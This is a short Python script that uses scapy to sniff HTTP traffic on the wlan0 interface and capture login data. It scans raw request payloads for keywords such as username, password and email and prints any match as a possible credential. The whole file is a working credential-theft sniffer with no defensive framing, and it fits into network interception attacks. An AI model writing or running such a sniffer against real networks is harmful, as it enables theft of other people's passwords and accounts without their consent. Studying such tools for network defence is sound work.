
from scapy.layers import http
import scapy.all as scrapy
def sniff (interface):
     scrapy.sniff(iface=interface,store = False,prn=process_packet_sniff)
# def get_url(packet):
#     if packet.haslayer(http.HTTPRequest):
#         web_visit = str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].path)
#         return web_visit

def get_log_in(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scrapy.Raw):
            load = str(packet[scrapy.Raw].load)
            keywords = ['username', "password", "email", "pass", "login"]
            for element in keywords:
                if element in load:
                    return load


def process_packet_sniff(packet):
    if packet.haslayer(http.HTTPRequest):
        # web_visit =get_url(packet)
        # print("[+] HTTP request  >>> " + str(web_visit))
        if packet.haslayer(scrapy.Raw):
            load = get_log_in(packet)
            print("\n\n[+] possible username and password   >>> \n\n" + str(load))
sniff("wlan0")